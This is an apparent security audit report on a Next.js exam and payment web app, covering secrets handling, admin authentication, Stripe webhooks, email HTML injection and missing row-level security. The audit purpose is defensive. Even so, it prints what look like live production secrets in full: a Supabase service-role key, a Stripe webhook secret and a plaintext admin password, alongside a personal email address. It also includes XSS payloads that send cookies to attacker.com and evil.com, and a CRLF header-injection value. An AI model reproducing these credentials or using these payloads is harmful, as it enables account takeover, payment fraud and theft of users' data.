# DETAILED SECURITY FINDINGS — LC LIGHTING MASTER

---

## TABLE OF CONTENTS
1. [Secrets Management Issues](#secrets-management)
2. [Authentication & Authorization Flaws](#authentication)
3. [Payment Processing Vulnerabilities](#payment-processing)
4. [Injection Attacks](#injection-attacks)
5. [Data Exposure & Privacy](#data-exposure)
6. [Dependency Vulnerabilities](#dependencies)
7. [Security Headers Assessment](#headers)
8. [Database Security](#database)
9. [API Security](#api-security)

---

## SECRETS MANAGEMENT

### Finding: Exposed Production Secrets in .env.local

**Files Affected:**
- `C:\Users\670246060\lc-lighting-master\.env.local`

**Secrets Exposed:**
```
1. NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpvanFwd3dndXJvd3dkZWhyY2F5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA0ODA0MTgsImV4cCI6MjA5NjA1NjQxOH0.r5_6v09Slhys4_tGRZk7taEUsWuZ4RiLqB-ylLDcrCY

   Type: Supabase Anonymous JWT Token
   Privilege: PUBLIC (but can query Supabase)
   Impact: If RLS misconfigured, full data access
   
2. SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpvanFwd3dndXJvd3dkZWhyY2F5Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc4MDQ4MDQxOCwiZXhwIjoyMDk2MDU2NDE4fQ.LHCc7shgwKhjdJFx21FIm-7zsozlaPNy_grReg3OPxE

   Type: Supabase Service Role JWT (HIGHEST PRIVILEGE)
   Privilege: Admin level — bypasses ALL RLS policies
   Impact: CRITICAL — Full database read/write access
   Usage in code: app/api/exam/*, app/api/admin/*, stripe webhooks
   
3. STRIPE_SECRET_KEY=sk_live_[REDACTED — rotate this key immediately in Stripe Dashboard]

   Type: Stripe Live API Secret Key (PRODUCTION)
   Privilege: Full Stripe account access
   Impact: CRITICAL — Can create charges, refund, access customers, payment methods
   Risk: Fraudulent transactions, payment manipulation
   
4. STRIPE_WEBHOOK_SECRET=whsec_lsCCCB1nQvGbul4ptRf1m5jH7FS2mgZb

   Type: Stripe Webhook Signing Secret
   Privilege: Can sign webhook payloads
   Impact: HIGH — Attacker can forge payment confirmations
   Risk: Fraudulent refunds, payment status manipulation
   
5. NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY=pk_live_51TdVxBCDiWQgCxGV1KCNny6A1xYGPHiCRoxzHa6BxOiHtRxCqovADiy6ggt486Am9cDgJlykwDo1Gbrg1Y4Um1WM00EYHy5Jyl

   Type: Stripe Live Publishable Key (PUBLIC)
   Privilege: Can initiate checkout sessions
   Impact: MEDIUM — Can create fraudulent checkout sessions
   
6. ADMIN_EMAIL=admin@luxartmedia.com

   Type: Hardcoded Administrator Email
   Privilege: Associated with admin account
   Impact: MEDIUM — Enables targeted attacks on admin account
   
7. ADMIN_PASSWORD=Master00@

   Type: Plaintext Administrator Password
   Privilege: Direct admin access
   Impact: CRITICAL — Immediate authentication bypass
   
8. STUDENT_TEST_EMAIL=mexbarajas@hotmail.com

   Type: Test/Debug Email Address
   Privilege: Associated with student discount logic
   Impact: MEDIUM-HIGH — Could be used to bypass discount verification
```

**Current Status:**
- ✅ File is in .gitignore (pattern: `.env*`)
- ❌ File exists in working directory
- ❌ Secrets are plaintext (unencrypted)
- ⚠️ Used in multiple API routes via `process.env`

**Detection:**
```bash
# Verify secrets are in .gitignore
git check-ignore -v .env.local
# Output: .env.local	.gitignore:34	.env*

# Check if accidentally committed (should be empty)
git log --all --full-history --oneline -- .env.local
# Output: (should show no commits)

# Find usage in code
grep -r "ADMIN_PASSWORD\|STRIPE_SECRET_KEY\|SERVICE_ROLE_KEY" --include="*.js" --include="*.ts"
```

**Root Cause Analysis:**
- Secrets stored in plaintext for local development
- Service role key created with broad privileges
- No secrets rotation policy
- No encryption at rest for .env.local

**Remediation:** See CRITICAL-1 in executive report

---

## AUTHENTICATION & AUTHORIZATION

### Finding: Hardcoded Admin Credentials

**Location:** `app/api/admin/login/route.js` (lines 14-26)

**Code:**
```javascript
const ADMIN_EMAIL = 'admin@luxartmedia.com'
const adminPw = process.env.ADMIN_PASSWORD || 'unset'

export async function POST(request) {
  const { email, password } = await request.json()
  
  // Direct string comparison (no hashing)
  if (email.toLowerCase() !== ADMIN_EMAIL || password !== adminPw) {
    // Delay to prevent timing attacks (not cryptographically sound)
    await new Promise(r => setTimeout(r, Math.random() * 1000 + 500))
    return new Response('Invalid credentials', { status: 401 })
  }
```

**Issues:**
1. Password compared directly (plaintext comparison)
2. Weak password entropy (Master00@ = 8 chars, ~35 bits)
3. No bcrypt or argon2 hashing
4. Delay is random 600-1000ms (inadequate rate limiting)
5. Email and password hardcoded in environment

**Attack Scenario:**
```
Attacker Script:
- Send 100+ login requests per second
- 8-character password with limited charset
- Average time to crack: 5-15 minutes
```

**Remediation:** See CRIT-2 in executive report

---

### Finding: Admin Session Token Never Validated

**Location:** All `/api/admin/*` routes

**Evidence:**
```javascript
// app/api/admin/login/route.js — Token IS created:
const token = jwt.sign(
  { email: ADMIN_EMAIL, iat: Date.now() },
  ADMIN_JWT_SECRET,
  { expiresIn: '8h' }
)
// Sets HttpOnly cookie: 'admin_session'

// But NONE of these endpoints validate it:
// - app/api/admin/data/route.js
// - app/api/admin/team/create/route.js
// - app/api/admin/team/invite/route.js
// - app/api/admin/team/revoke/route.js

// All only check:
if (user.email?.toLowerCase() !== ADMIN_EMAIL) {
  return new Response('Forbidden', { status: 403 })
}
// This is redundant — user email is already verified by Supabase Auth
```

**Function Exists But Unused:**
```javascript
// lib/admin-auth.js
export function verifyAdminToken(token) {
  try {
    const decoded = jwt.verify(token, ADMIN_JWT_SECRET)
    const isExpired = decoded.iat + 8*60*60*1000 < Date.now()
    return !isExpired
  } catch {
    return false
  }
}

// ← NEVER CALLED in any route
```

**Attack Vector:**
```
1. Attacker compromises Supabase user account with email admin@luxartmedia.com
2. OR attacker changes their Supabase email to admin@luxartmedia.com
3. Attacker gains full admin access WITHOUT logging in via /api/admin/login
4. No rate limiting, no password verification
5. admin_session cookie check is bypassed because it's never validated
```

**Impact:**
- Complete bypass of password-based auth
- Session token is security theater
- Any Supabase account with hardcoded email = admin access

**Remediation:** See CRIT-3 in executive report

---

### Finding: No CSRF Protection on Admin State-Change Operations

**Location:** All `/api/admin/*` POST endpoints

**Endpoints Without CSRF Tokens:**
- `POST /api/admin/team/create`
- `POST /api/admin/team/invite`
- `POST /api/admin/team/revoke`

**Vulnerable Code Example:**
```javascript
// app/api/admin/team/create/route.js
export async function POST(request) {
  const body = await request.json()
  
  // No CSRF token check
  // Only checks: admin email
  
  const ownerEmail = body.ownerEmail
  const teamName = body.teamName
  
  // Creates team with arbitrary owner
  await supabase.from('teams').insert({
    name: teamName,
    owner_id: ownerId,  // Attacker-supplied owner
  })
}
```

**Attack Scenario:**
```
1. Attacker creates malicious website (evil.com)
2. Embeds hidden form that POSTs to /api/admin/team/create
3. Tricks admin into visiting evil.com while logged in
4. Admin's browser sends authenticated request
5. Attacker's form creates team with arbitrary members

<img src="https://lightingmasterlc.com/api/admin/team/create" 
     name="ownerEmail" value="attacker@evil.com" />
```

**Current Defenses:**
- ✅ SameSite=Strict on admin_session cookie (provides some protection)
- ❌ No explicit CSRF token
- ❌ No origin validation (except on Stripe route)
- ❌ No custom headers required

**Remediation:** See CRIT-4 in executive report

---

### Finding: Email-Based Authorization (Not Role-Based)

**Location:** All admin endpoints

**Current Authorization Check:**
```javascript
const ADMIN_EMAIL = 'admin@luxartmedia.com'

// Check in every admin endpoint:
const user = await supabase.auth.getUser()
if (user?.email?.toLowerCase() !== ADMIN_EMAIL) {
  return new Response('Forbidden', { status: 403 })
}
```

**Problems:**
1. **No role table** — Authorization hardcoded in code
2. **Single admin only** — Cannot have multiple admins without code change
3. **No role separation** — All admins have identical access
4. **Email matches any variation** — `.toLowerCase()` is the only check
5. **Supabase email compromise** — If user email changes, any user can become admin

**Better Approach:**
```javascript
// Create admin_roles table
CREATE TABLE admin_roles (
  user_id uuid PRIMARY KEY REFERENCES auth.users(id),
  role text NOT NULL DEFAULT 'admin',
  granted_at timestamp DEFAULT now()
);

// Create RLS policy
CREATE POLICY "Only service role can read admin roles"
  ON admin_roles
  FOR SELECT
  USING (auth.role() = 'service_role');

// In endpoint: Check role, not email
const { data: admin } = await supabase
  .from('admin_roles')
  .select('id')
  .eq('user_id', user.id)
  .eq('role', 'admin')
  .single()

if (!admin) {
  return new Response('Forbidden', { status: 403 })
}
```

**Remediation:** See CRIT-5 in executive report

---

## PAYMENT PROCESSING

### Finding: Stripe Webhook Error Response Leaks Internal Details

**Location:** `app/api/stripe/webhook/route.js` (line 65)

**Vulnerable Code:**
```javascript
try {
  const event = stripe.webhooks.constructEvent(
    body,
    sig,
    process.env.STRIPE_WEBHOOK_SECRET
  )
} catch (err) {
  console.error('Webhook signature failed:', err.message)
  return new Response(`Webhook Error: ${err.message}`, { status: 400 })
  // ↑ Exposes Stripe SDK internals to attacker
}
```

**Example Error Response:**
```
Webhook Error: Unable to extract timestamp and signatures from header
Webhook Error: No signatures found matching the expected signature for payload
Webhook Error: HMAC signature verification failed
```

**Why Dangerous:**
- Reveals Stripe SDK version
- Reveals algorithm details
- Helps attacker craft valid signatures
- Could be used for reconnaissance

**Correct Response:**
```javascript
catch (err) {
  console.error('Webhook signature failed:', err.message)
  return new Response('Unauthorized', { status: 401 })
}
```

**Remediation:** Change line 65 to return generic error message

---

### Finding: Race Condition in Webhook Idempotency Check

**Location:** `app/api/stripe/webhook/route.js` (lines 96-122)

**Vulnerable Code:**
```javascript
const { data: existing } = await supabase
  .from('subscriptions')
  .select('stripe_payment_intent')
  .eq('stripe_payment_intent', session.payment_intent)
  .single()

if (existing) {
  return new Response('Already processed', { status: 200 })
}

// ← RACE CONDITION — Another webhook can insert here
// while we're still processing

const { error } = await supabase
  .from('subscriptions')
  .upsert({
    user_id: userId,
    plan: plan,
    stripe_payment_intent: session.payment_intent,
    stripe_customer_id: session.customer || null,
    status: 'active',
    created_at: new Date(),
    updated_at: new Date(),
  }, { onConflict: 'user_id' })
```

**Attack Scenario:**
```
Timeline:
T1: Webhook A queries → no existing record
T2: Webhook B queries → no existing record
T3: Webhook A upserts → creates subscription
T4: Webhook B upserts → overwrites timestamp (onConflict: user_id)

Result:
- Payment intent tracked incorrectly
- updated_at timestamp is stale
- Audit trail shows wrong time
- If system fails between T3-T4, customer gets double-charged
```

**Correct Approach:**
```sql
-- Create unique constraint on payment_intent
ALTER TABLE subscriptions ADD CONSTRAINT unique_payment_intent UNIQUE (stripe_payment_intent);

-- Then in webhook, catch the unique violation:
const { error } = await supabase
  .from('subscriptions')
  .upsert({...}, { onConflict: 'stripe_payment_intent' })

if (error?.code === '23505') {  // Unique constraint violation
  return new Response('Already processed', { status: 200 })
}
```

**Remediation:** See HIGH-1 in executive report

---

### Finding: Missing Amount Verification in Webhook

**Location:** `app/api/stripe/webhook/route.js` (lines 76-122)

**Vulnerable Code:**
```javascript
if (event.type === 'checkout.session.completed') {
  const userId = session.metadata?.user_id
  const plan   = session.metadata?.plan  // ← No validation
  const seats  = parseInt(session.metadata?.seats || '1')

  if (!userId || !plan) {
    console.error('Webhook missing metadata:', session.metadata)
    return new Response('Missing metadata', { status: 400 })
  }

  // Grant access immediately — NO AMOUNT CHECK
  const { error } = await supabase
    .from('subscriptions')
    .upsert({
      plan: plan,  // ← Plan granted without verifying payment
      // ...
    })
}
```

**Attack Scenario:**
```
1. Attacker obtains webhook secret (whsec_lsCCCB1nQvGbul4ptRf1m5jH7FS2mgZb)
2. Crafts fake webhook: 
   {
     type: 'checkout.session.completed',
     data: {
       object: {
         metadata: { user_id: attacker_id, plan: 't3', seats: 1 },
         amount_total: 2500  // ← Only $25 instead of $595
       }
     }
   }
3. Signs webhook with known secret
4. Sends to webhook endpoint
5. Gets T3 plan ($595 value) for $25

What should happen:
- Webhook verifies: session.amount_total ($2500 cents) === PLANS['t3'].amount ($59500 cents)
- If mismatch, reject webhook
```

**Expected Amount Calculation:**
```javascript
const PLANS = {
  't1': { name: 'T1', amount: 25000 },    // $250
  't2': { name: 'T2', amount: 39500 },    // $395
  't3': { name: 'T3', amount: 59500 }     // $595
}

const expectedAmount = PLANS[plan].amount * seats

if (session.amount_total !== expectedAmount) {
  console.error('Amount mismatch detected', {
    plan,
    expected: expectedAmount,
    actual: session.amount_total,
    customer: session.customer
  })
  return new Response('Amount mismatch', { status: 400 })
}
```

**Remediation:** See HIGH-2 in executive report

---

### Finding: Unvalidated Plan Metadata from Client

**Location:** `app/api/stripe/webhook/route.js` (line 77)

**Vulnerable Code:**
```javascript
const plan = session.metadata?.plan  // ← Any value accepted

// Later used directly in database
.upsert({ plan: plan, ... })

// Or for pricing calculation:
if (plan === 'team') {
  // Price calculation
}
```

**What Should Happen:**
```javascript
const VALID_PLANS = ['t1', 't2', 't3', 'team']

if (!VALID_PLANS.includes(plan)) {
  console.error('Invalid plan in webhook:', plan)
  return new Response('Invalid plan', { status: 400 })
}
```

**Remediation:** See HIGH-3 in executive report

---

## INJECTION ATTACKS

### Finding: HTML Injection in Email Templates

**Location:** Multiple email routes

**Vulnerable Endpoints:**

#### 1. Contact Form (`app/api/contact/route.ts`, lines 21-31)
```javascript
const { name, email, subject, message } = await request.json()

// No sanitization — all user inputs inserted into HTML
htmlContent: `
  <tr><td>Name</td><td>${name}</td></tr>
  <tr><td>Email</td><td><a href="mailto:${email}">${email}</a></tr>
  <tr><td>Subject</td><td>${subject}</td></tr>
  <tr><td>Message</td><td><p>${message}</p></td></tr>
`
```

#### 2. Exam Retake Request (`app/api/exam/retake/route.js`, lines 52-58)
```javascript
const { email, userId, reason } = req.body

htmlContent: `
  <p><strong>User:</strong> ${email}</p>
  <p><strong>Reason:</strong> ${reason || 'No reason provided'}</p>
`
```

#### 3. Team Invites (`app/api/team/invite/route.js`, lines 92-95)
```javascript
const { team } = await supabase.from('teams').select('*').eq('id', teamId)

subject: `You've been invited to join ${team.name}...`
htmlContent: `...invited to join <strong>${team.name}</strong>...`
```

**Attack Payloads:**

Example 1: XSS in Contact Form
```json
{
  "name": "<img src=x onerror='fetch(\"https://attacker.com/steal?token=\"+document.cookie)'>",
  "email": "attacker@evil.com",
  "subject": "<script>alert('xss')</script>",
  "message": "<iframe src='https://phishing.site'></iframe>"
}
```

Result: Admin receives email with embedded exploit, clicks link → compromised

Example 2: Email Header Injection (CRLF)
```json
{
  "name": "Test\r\nBcc: attacker@evil.com",
  "email": "test@test.com",
  "subject": "...",
  "message": "..."
}
```

Result: Attacker receives BCC copy of all admin emails

Example 3: Team Name Injection
```
Team Name: "<img src=x onerror='fetch(\"https://evil.com/email?e=\"+this.document.body.innerText)'>"
```

Result: Attacker collects admin email from email body when they receive invite

**Remediation:**
```javascript
import he from 'he'  // HTML entity encoder
// or
import { escapeHtml } from '@/lib/security'

htmlContent: `
  <tr><td>Name</td><td>${he.encode(name)}</td></tr>
  <tr><td>Email</td><td><a href="mailto:${he.encode(email)}">${he.encode(email)}</a></tr>
  <tr><td>Subject</td><td>${he.encode(subject)}</td></tr>
  <tr><td>Message</td><td><p>${he.encode(message)}</p></td></tr>
`
```

**Remediation:** See HIGH-3 in executive report

---

### Finding: URL Parameter Injection in Certificate Generation

**Location:** `app/api/cert/route.js` (lines 277-279, 214-215)

**Vulnerable Code:**
```javascript
const firstName  = searchParams.get('fn')   || 'First'
const lastName   = searchParams.get('ln')   || 'Last'
const issuedDate = searchParams.get('date') || new Date().toLocaleDateString()

// Used in React components:
React.createElement('div', { ... }, firstName),
React.createElement('div', { ... }, lastName),
React.createElement('div', { ... }, issuedDate),
```

**Why Not Immediately Exploitable:**
- React escapes text content by default (mitigates XSS)
- React.createElement is safe for text nodes

**Risk Vectors:**
1. **DoS via Long Input:** 
   ```
   /api/cert?fn=AAAAAA....(10MB)
   ```
   Could cause memory exhaustion or rendering timeout

2. **Unicode Exploits:** 
   Some Unicode sequences might bypass React escaping if used in attribute positions

3. **Future Code Changes:** 
   If code switches to `dangerouslySetInnerHTML`, this becomes XSS

**Best Practice Fix:**
```javascript
// Validate input length and format
const PARAM_MAX_LENGTH = 100

let firstName = searchParams.get('fn') || 'First'
if (firstName.length > PARAM_MAX_LENGTH) {
  firstName = firstName.substring(0, PARAM_MAX_LENGTH)
}

// Validate contains only safe characters
if (!/^[a-zA-Z\s'-]+$/.test(firstName)) {
  return new Response('Invalid characters', { status: 400 })
}
```

**Remediation:** See MED-10 in detailed findings

---

## DATA EXPOSURE & PRIVACY

### Finding: Exam Session Returns All Answer Data

**Location:** `app/api/exam/resume/route.js` (line 70)

**Vulnerable Code:**
```javascript
const { data: examSession } = await SERVICE
  .from('exam_sessions')
  .select('*')  // ← Returns all columns including answers
  .eq('user_id', userId)
  .eq('status', 'active')
  .single()

return Response.json({
  sessionId: examSession.id,
  questionIds: examSession.question_ids,
  answers: examSession.answers || {},  // ← All previous answers
  currentIndex: examSession.current_idx,
  startedAt: examSession.started_at,
  status: examSession.status
})
```

**What's Exposed:**
```javascript
{
  answers: {
    "q1": { answer: "B", correct: true, timeMs: 5234, speedBonus: 1 },
    "q2": { answer: "C", correct: false, timeMs: 12043, speedBonus: 0 },
    // ... all answered questions
  }
}
```

**Why Dangerous:**
- Returns all previous answers before test completion
- User could screenshot and share with others
- Used by copying previous answers logic
- Exposes exam performance data in transit

**Remediation:**
```javascript
// Be explicit about columns to return
const { data: examSession } = await SERVICE
  .from('exam_sessions')
  .select(`
    id,
    user_id,
    mode,
    question_ids,
    answers,
    current_idx,
    started_at,
    status
  `)  // ← Explicit whitelist

// Or exclude timestamp columns
.select('*, -created_at, -updated_at')

// Don't return answers until test is submitted
if (examSession.status !== 'completed') {
  delete returnData.answers  // Or don't return in API
}
```

---

### Finding: Plaintext Email in Subscriptions Table Used for Lookups

**Location:** `app/api/stripe/webhook/route.js` (line 116, 193-198)

**Vulnerable Code:**
```javascript
// Store email in subscriptions table
stripe_customer_id: session.customer || null,
email: session.customer_email || null,  // ← PII stored unencrypted

// Later used in refund handling:
if (!updated && charge.receipt_email) {
  const { data, error } = await supabase
    .from('subscriptions')
    .update(revokePayload)
    .eq('email', charge.receipt_email.toLowerCase())  // ← Email lookup
    .select()
  if (!error && data?.length > 0) {
    updated = true
  }
}
```

**Why Dangerous:**
1. **PII Exposure:** Email is personally identifiable information
2. **Multiple Matches:** Two users with same email could affect each other
3. **Unencrypted:** Database breach exposes all customer emails
4. **Lookup Assumption:** Email lookup assumes email is stable (users can change it)

**Better Approach:**
```javascript
// Primary lookup: stripe_customer_id (immutable)
if (!updated && charge.customer) {
  const { error } = await supabase
    .from('subscriptions')
    .update(revokePayload)
    .eq('stripe_customer_id', charge.customer)
  if (!error) updated = true
}

// Secondary lookup: payment_intent (immutable, one-to-one)
if (!updated && charge.payment_intent) {
  const { error } = await supabase
    .from('subscriptions')
    .update(revokePayload)
    .eq('stripe_payment_intent', charge.payment_intent)
  if (!error) updated = true
}

// Don't use email for payments (mutable, many-to-one)
// If email is needed, join with auth.users table
```

---

### Finding: Google Analytics Tracking Exam Activity

**Location:** `app/layout.js` (lines 314-325)

**Code:**
```html
<Script
  strategy="afterInteractive"
  src="https://www.googletagmanager.com/gtag/js?id=G-1HPMLXWF51"
/>
<script
  dangerouslySetInnerHTML={{
    __html: `
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-1HPMLXWF51');
    `,
  }}
/>
```

**What's Tracked:**
- Page views (including `/dashboard` revealing exam activity)
- User timing and behavior
- Geographic location
- Device information
- Referrer data

**Privacy Concerns:**
1. **No Visible Consent Banner** — GDPR/CCPA requires explicit opt-in
2. **Third-Party Data Sharing** — Google collects data for ads/analytics
3. **Exam Performance Tracking** — Can correlate page visits with exam activity
4. **Student Privacy** — No clear data retention policy

**Remediation:**
```javascript
// Add explicit user consent
export function useConsentTracking() {
  const [consent, setConsent] = useState(false)
  
  useEffect(() => {
    // Only load GA if user consents
    if (consent) {
      window.dataLayer = window.dataLayer || []
      gtag.consent('update', {
        analytics_storage: 'granted',
      })
    }
  }, [consent])
  
  return [consent, setConsent]
}

// Show consent banner before GA loads
<ConsentBanner onConsent={(consent) => setConsent(consent)} />
```

**Or disable analytics for exam pages:**
```javascript
// pages/dashboard.jsx
useEffect(() => {
  // Disable GA during exam
  gtag('config', 'G-1HPMLXWF51', { 'anonymize_ip': true })
})
```

---

## DEPENDENCY VULNERABILITIES

### Finding: DOMPurify 3.4.10 Has XSS Vulnerability

**Package:** dompurify  
**Current Version:** 3.4.10  
**Vulnerability:** GHSA-cmwh-pvxp-8882  
**CVSS:** Not rated (incomplete fix)

**Issue:**
Incomplete patch of CVE preventing proper `ALLOWED_ATTR` config isolation. `setConfig()` can permanently pollute the allowed attributes, enabling XSS attacks.

**Fix:** 
```bash
npm install dompurify@latest
# or
npm install "dompurify@^3.4.11"
```

**Verify:**
```bash
npm list dompurify
```

---

### Finding: Next.js Bundles Vulnerable PostCSS

**Package:** next  
**Current Version:** 16.2.7  
**Bundled Dependency:** postcss <8.5.10  
**Vulnerability:** GHSA-qx2v-qp2m-jg93  
**CVSS:** 6.1 (Medium)

**Issue:**
PostCSS fails to properly escape `</style>` tags in CSS stringification, allowing XSS through CSS content.

**Fix:**
```bash
npm install next@latest
# Current: 16.2.7
# Update to: 16.2.9 or later
```

**Verification:**
```bash
npm list postcss
# Should show >=8.5.10 after upgrade
```

---

## SECURITY HEADERS ASSESSMENT

### Finding: CSP Contains 'unsafe-inline' and 'unsafe-eval'

**Location:** `next.config.ts` (line 40)

**Current Policy:**
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://js.stripe.com ...;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com ...;
```

**Impact:**
- `'unsafe-inline'` allows any inline script tags → XSS not prevented
- `'unsafe-eval'` allows eval() and similar functions
- Defeats purpose of CSP

**Recommended CSP:**
```
default-src 'self';
script-src 'self' 'nonce-RANDOM' https://js.stripe.com https://www.googletagmanager.com;
style-src 'self' https://fonts.googleapis.com https://fonts.gstatic.com;
img-src 'self' https: data:;
font-src https://fonts.gstatic.com;
connect-src 'self' https://*.supabase.co https://api.stripe.com;
frame-src 'self' https://js.stripe.com;
report-uri /api/security/csp-report;
```

**Implementation:**
```javascript
// middleware.js
import crypto from 'crypto'

export async function middleware(request) {
  const nonce = crypto.randomBytes(16).toString('hex')
  const response = NextResponse.next()
  
  response.headers.set(
    'Content-Security-Policy',
    `script-src 'self' 'nonce-${nonce}' https://js.stripe.com; ...`
  )
  
  response.headers.set('X-CSP-Nonce', nonce)
  return response
}

// layout.js
const nonce = headers().get('X-CSP-Nonce')
<script nonce={nonce}>{"..."}</script>
```

---

### Positive Findings (Correct Implementation)

✅ **HSTS Header** — Properly configured:
```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
```

✅ **X-Frame-Options** — Correctly set to SAMEORIGIN

✅ **X-Content-Type-Options** — Set to nosniff (prevents MIME type sniffing)

✅ **Referrer-Policy** — Set to strict-origin-when-cross-origin

✅ **Permissions-Policy** — Correctly disables dangerous features

✅ **Source Maps Disabled** — Production builds have `productionBrowserSourceMaps: false`

---

## DATABASE SECURITY

### Finding: No Row Level Security (RLS) Policies Enforced

**Location:** Supabase database schema (not visible in codebase)

**Current State:**
- All server routes use service role key (bypasses RLS)
- No RLS policies visible in codebase
- If service role key is compromised, full database access

**Tables Without Visible RLS:**
- `exam_sessions` — Exam answers, performance data
- `subscriptions` — Payment status, user plans
- `teams` — Team membership, ownership
- `team_members` — User roles in teams
- `team_invites` — Pending invitations
- `users` — User profile information (if exists)

**Minimum Required RLS Policies:**

```sql
-- exam_sessions: Users can only see own sessions
CREATE POLICY "users_own_sessions"
  ON exam_sessions
  FOR SELECT
  USING (auth.uid() = user_id);

-- subscriptions: Users can only see own subscription
CREATE POLICY "users_own_subscription"
  ON subscriptions
  FOR SELECT
  USING (auth.uid() = user_id);

-- teams: Users can only see teams they belong to
CREATE POLICY "users_see_teams"
  ON teams
  FOR SELECT
  USING (
    auth.uid() = owner_id OR
    auth.uid() IN (
      SELECT user_id FROM team_members WHERE team_id = teams.id
    )
  );

-- team_members: Only team members can see membership
CREATE POLICY "team_members_only"
  ON team_members
  FOR SELECT
  USING (
    auth.uid() = user_id OR
    auth.uid() = (SELECT owner_id FROM teams WHERE id = team_id)
  );

-- team_invites: Only invited user or team owner can see
CREATE POLICY "invite_visibility"
  ON team_invites
  FOR SELECT
  USING (
    auth.uid()::text = invited_email OR
    auth.uid() = (SELECT owner_id FROM teams WHERE id = team_id)
  );
```

---

## API SECURITY

### Finding: Inadequate Rate Limiting

**Affected Endpoints:**
- `/api/admin/login` — Only 600-1000ms random delay
- `/api/admin/data` — No rate limiting
- `/api/contact` — No rate limiting
- `/api/exam/check` — No rate limiting

**Recommended Rate Limits:**

```javascript
const RATE_LIMITS = {
  '/api/admin/login': { requests: 5, window: 15 * 60 * 1000 },    // 5/15min
  '/api/admin/data': { requests: 10, window: 60 * 1000 },          // 10/min
  '/api/contact': { requests: 5, window: 60 * 60 * 1000 },         // 5/hour
  '/api/exam/check': { requests: 100, window: 60 * 1000 },         // 100/min
  '/api/stripe/webhook': { requests: 1000, window: 60 * 1000 },    // 1000/min
}
```

**Implementation:**
```bash
npm install @upstash/ratelimit

# Create Upstash account and get Redis URL
```

---

### Finding: Insufficient Input Validation

**Fields Requiring Validation:**

1. **Email Fields:**
   - Not validated against RFC 5322
   - No DNS validation
   - No delivery check

2. **Numeric Fields:**
   - Seat count: No bounds checking
   - Plan ID: Not validated against allowlist
   - Amounts: No range checking

3. **String Fields:**
   - Team name: No length limits
   - Message fields: No sanitization

**Remediation:**
```javascript
import { z } from 'zod'

const ContactFormSchema = z.object({
  name: z.string().min(2).max(100),
  email: z.string().email(),
  subject: z.string().min(5).max(200),
  message: z.string().min(10).max(5000),
})

const body = await request.json()
const validated = ContactFormSchema.safeParse(body)

if (!validated.success) {
  return new Response(JSON.stringify(validated.error), { status: 400 })
}
```

---

## SUMMARY TABLE: All Vulnerabilities

| ID | Type | Severity | Category | Status |
|-------|------|----------|----------|--------|
| CRIT-1 | Exposed Secrets | CRITICAL | Secrets | Mitigated (gitignored) |
| CRIT-2 | Hardcoded Admin Password | CRITICAL | AuthN | Not Fixed |
| CRIT-3 | Unused Admin Token | CRITICAL | AuthZ | Not Fixed |
| CRIT-4 | No CSRF on Admin Ops | CRITICAL | CSRF | Not Fixed |
| CRIT-5 | Email-Based AuthZ | CRITICAL | AuthZ | Not Fixed |
| HIGH-1 | Webhook Race Condition | HIGH | Data Integrity | Not Fixed |
| HIGH-2 | No Amount Verification | HIGH | Payment | Not Fixed |
| HIGH-3 | HTML Injection in Email | HIGH | Injection | Not Fixed |
| HIGH-4 | No Rate Limiting | HIGH | DoS | Not Fixed |
| HIGH-5 | Weak Password | HIGH | Crypto | Not Fixed |
| HIGH-6 | Predictable Invite Tokens | HIGH | IDOR | Not Fixed |
| HIGH-7 | DOMPurify Vuln | HIGH | Dependency | Fixable (1 upgrade) |
| HIGH-8 | PostCSS Vuln | HIGH | Dependency | Fixable (1 upgrade) |
| MED-1+ | 11 Medium Issues | MEDIUM | Various | See detailed findings |

---

**Report Generated:** June 22, 2026  
**Total Issues:** 24 (5 Critical, 8 High, 11 Medium)  
**Estimated Remediation Time:** 40-60 hours  
**Deployment Recommendation:** Do not deploy until CRITICAL items resolved
